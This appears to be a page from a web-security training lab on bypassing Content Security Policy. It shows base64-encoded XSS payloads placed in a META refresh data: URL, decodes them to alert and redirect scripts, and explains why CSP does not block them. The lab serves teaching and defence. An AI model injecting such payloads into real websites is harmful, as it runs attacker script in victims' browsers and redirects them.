<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	<title>CSP Attacks</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<meta name="generator" content="CSP Attacks">
	<meta name="viewport" content="width=device-width">
</head>

<body>
<div class="wrapper">
	<?php include "navi.html";?>


	<div id="content">
<h1>META URL - BASE64 encoded JS</h1>
Hello there,
<script src="js/02a_domjs_docwrite.js" type="text/javascript"></script>
<br><br>
This is the same site as 02.A. In 02.A we've seen, that pure html can be injected. In this scenario we use the META-tag to inject base64 encoded javascript.
<br>
<h3>Attack Examples:</h3>
Here are a two examples of javascript encoded in the META tag url field.
<xmp><META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4="></xmp>
The code above hold our javascript in base64 "PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=". It translates to the following code:
<xmp><script>alert('IhaveYouNow');</script></xmp>

However, after the attack we are presented with a blank page. That's because we told the victims browser to refresh the URL "our javascript code" and not the URL of the website with the XSS vulnerability.<br>
So we got the user to run our code but he's not on the site anymore. We can fix that by adding a redirect in our javascript code to go to whatever page we want (could be the original one or something else...)<br>
<xmp><META HTTP-EQUIV="refresh" CONTENT="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIScpO3dpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKCJodHRwOi8vd3d3Lmhhc2h0YWdzZWN1cml0eS5jb20iKTs8L3NjcmlwdD4="></xmp>
<br>
This base64 encoded string translates to the following JS.
<xmp><script>alert('XSS!');window.location.replace("http://www.hashtagsecurity.com");</script></xmp>
<br>
This inline-javascript isn't blocked by CSP is because it's not being executed on the website but in a new blank tab. The CSP is only active on it's origin site.
<br><br>
URL before sending the request:<br>
<img src="data/images/P06-01_URL.png">
XSS popup after sending request:<br>
<img src="data/images/P06-02_XSS.png">
Injected JS included a page redirect, otherwise the victim would be stuck at a blank white page.<br>
<img src="data/images/P06-03_redirect.png"><br>
<br>
        <br><br><b>Sources:<br></b>
        <a href="http://blog.sec-consult.com/2013/07/content-security-policy-csp-another.html">SEC Consultant - Another example on application security and "assumptions vs. reality"</a>
        <br><br><br>
<br>
<p><a href="http://www.twitter.com/HashtagSecurity">@HashtagSecurity</a> - <a href="http://www.hashtagsecurity.com/csp">Blogpost</a></p>
</div>
</div>

</body>
</html>
